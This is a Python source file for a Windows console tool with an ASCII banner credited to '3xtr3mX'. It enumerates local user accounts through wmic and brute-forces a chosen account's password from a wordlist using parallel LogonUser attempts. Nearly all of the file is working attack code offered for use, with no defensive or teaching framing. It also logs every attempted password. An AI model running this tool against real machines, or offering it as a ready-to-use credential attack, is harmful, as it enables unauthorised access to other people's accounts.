import os
import win32security
import time
from multiprocessing import Pool, Manager, Lock

LOG_FILE = "log.txt"

def write_log(message):
    """
    Écrit un message dans le fichier log.
    """
    with open(LOG_FILE, "a") as log_file:
        log_file.write(message + "\n")

def list_users():
    """
    Liste les comptes utilisateurs locaux.
    """
    try:
        print("\n[INFO] Listing local user accounts...\n")
        raw_output = os.popen("wmic useraccount where \"localaccount='true'\" get name").read()
        users = [line.strip() for line in raw_output.splitlines() if line.strip()]  # Nettoyer les lignes
        for user in users[1:]:  # Ignorer l'en-tête "Name"
            print(user)
    except Exception as e:
        print(f"Error listing users: {e}")
        write_log(f"[ERROR] Error listing users: {e}")
    input("\nPress any key to return to the main menu...")

def change_log_file():
    """
    Change le fichier de log.
    """
    global LOG_FILE
    new_log_file = input("\n[INFO] Enter the new log file name (e.g., new_log.txt):\n>> ")
    LOG_FILE = new_log_file
    print(f"[INFO] Log file changed to: {LOG_FILE}")
    input("\nPress any key to return to the main menu...")

def clear_log_file():
    """
    Vide le contenu du fichier de log.
    """
    global LOG_FILE
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as log_file:
            log_file.write("")  # Effacer le contenu
        print(f"[INFO] Log file '{LOG_FILE}' has been cleared.")
    else:
        print(f"[INFO] Log file '{LOG_FILE}' does not exist.")
    input("\nPress any key to return to the main menu...")

def bruteforce():
    """
    Lance une attaque par force brute sur un compte utilisateur.
    """
    user = input("\n[TARGET USER]\n>> ")
    wordlist = input("\n[PASSWORD LIST]\n>> ")

    if not os.path.exists(wordlist):
        print("\nError: File not found")
        write_log(f"[ERROR] Wordlist file not found: {wordlist}")
        input("\nPress any key to return to the main menu...")
        return

    try:
        with open(wordlist, 'r') as file:
            passwords = [line.strip() for line in file]
    except Exception as e:
        print(f"Error reading wordlist: {e}")
        write_log(f"[ERROR] Error reading wordlist: {e}")
        return

    total_passwords = len(passwords)
    print(f"\n[INFO] Total passwords to test: {total_passwords}")
    write_log(f"[INFO] Starting bruteforce for user: {user}, Total passwords: {total_passwords}")

    start_time = time.time()
    manager = Manager()
    found_event = manager.Value('b', False)
    result_queue = manager.Queue()

    processes = min(4, os.cpu_count())  # Utilisation dynamique du nombre de cœurs CPU
    print(f"[INFO] Using {processes} processes for testing...")
    write_log(f"[INFO] Using {processes} processes for testing...")

    with Pool(processes=processes) as pool:
        tasks = [(user, password, idx + 1, total_passwords, found_event, result_queue) for idx, password in enumerate(passwords)]
        pool.starmap(try_password, tasks)

    end_time = time.time()
    elapsed_time = end_time - start_time
    passwords_per_second = total_passwords / elapsed_time

    if found_event.value:
        print("\n[+] Bruteforce completed. Password found!")
        write_log(f"[SUCCESS] Password found for user: {user}")
    else:
        print("\n[-] Bruteforce completed. No password found.")
        write_log(f"[INFO] Bruteforce completed. No password found for user: {user}")

    write_log(f"[STATS] Total time: {elapsed_time:.2f} seconds")
    write_log(f"[STATS] Passwords per second: {passwords_per_second:.2f}")

    while not result_queue.empty():
        print(result_queue.get())

    input("\nPress any key to return to the main menu...")

def try_password(user, password, attempt_num, total_attempts, found_event, result_queue):
    """
    Tente de valider un mot de passe pour un utilisateur donné.
    """
    if found_event.value:
        return False

    # Créer un Lock à l'intérieur du processus
    lock = Lock()

    try:
        if attempt_num % 1000 == 0:  # Mise à jour toutes les 1000 tentatives
            message = f"[INFO] Tested {attempt_num}/{total_attempts} passwords."
            result_queue.put(message)
            with lock:
                print(message)

        token = None
        try:
            token = win32security.LogonUser(
                user, None, password,
                win32security.LOGON32_LOGON_INTERACTIVE,
                win32security.LOGON32_PROVIDER_DEFAULT
            )
            success_message = f"[+] Password found: {password}"
            result_queue.put(success_message)
            with lock:
                print(success_message)
            found_event.value = True
            return True
        except win32security.error as e:
            # Log the specific error
            error_message = f"[ERROR] Failed to log in with password '{password}'. Error: {str(e)}"
            result_queue.put(error_message)
            with lock:
                print(error_message)
        finally:
            if token:
                token.Close()
    except Exception as e:
        error_message = f"[ERROR] An unexpected error occurred: {e}"
        result_queue.put(error_message)
        with lock:
            print(error_message)
    return False

def main_menu():
    """
    Menu principal du programme.
    """
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)  # Supprime l'ancien fichier log au démarrage

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(""" 
      ___.                 __          _____                            
      \_ |_________ __ ___/  |  _____/ ____\___________   ____  ____  
       | __ \_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
       | \_\ \  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/ 
       |___  /__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >
           \/                       \/                        \/    \/ 
      ╔══════════════════════════════════════════════════════╗
      ║                     by: 3xtr3mX                      ║
      ╚══════════════════════════════════════════════════════╝
        """)
        print("╔════════════════════╗")
        print("║  COMMANDS:         ║")
        print("║  1. List Users     ║")
        print("║  2. Bruteforce     ║")
        print("║  3. Change Log File║")
        print("║  4. Clear Log File ║")
        print("║  5. Quit           ║")
        print("╚════════════════════╝")
        choice = input(">> ")

        if choice == "1":
            list_users()
        elif choice == "2":
            bruteforce()
        elif choice == "3":
            change_log_file()
        elif choice == "4":
            clear_log_file()
        elif choice == "5":
            print("\n[INFO] Exiting... Goodbye!")
            break
        else:
            print("Invalid choice. Please select a valid option.")
            input("\nPress any key to continue...")

if __name__ == "__main__":
    main_menu()
